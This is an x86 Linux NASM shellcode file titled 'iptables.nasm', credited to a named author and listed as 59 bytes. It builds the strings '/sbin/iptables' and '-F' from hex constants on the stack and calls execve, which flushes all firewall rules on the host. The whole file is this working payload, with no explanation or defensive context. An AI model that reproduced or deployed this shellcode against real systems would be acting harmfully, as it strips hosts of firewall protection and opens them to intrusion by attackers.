; Filename: iptables.nasm
; Author: Eric Van Zutphen
; 59 bytes

global _start

section .text

_start:

       mov    ebx, eax
       xor    eax, ebx
       push   eax
       push   0x462d
       mov    esi,esp
       push   eax
       mov dword [esp-4], 0x73656c62
       mov dword [esp-8], 0x61747069
       mov dword [esp-12], 0x2f6e6962
       mov dword [esp-16], 0x732f2f2f
       sub esp, 16
       mov    ebx,esp
       push   eax
       push   esi
       push   ebx
       mov    ecx,esp
       mov    edx,eax
       mov    al,0xb ; execve syscall
       int    0x80